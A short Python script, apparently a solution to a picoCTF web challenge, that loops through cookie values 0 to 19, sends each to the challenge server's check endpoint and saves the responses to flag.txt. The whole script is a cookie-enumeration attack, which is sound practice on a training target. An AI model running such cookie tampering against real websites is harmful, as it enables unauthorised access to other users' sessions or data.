import requests
f=open('flag.txt','w')
for i in range (0,20):
    cookie = 'name={}'.format(i)
    header={
        'Cookie':cookie
    }
    r= requests.get('http://mercury.picoctf.net:17781/check',headers=header)
    print(r.text)
    f.write(r.text)
    f.write('\n')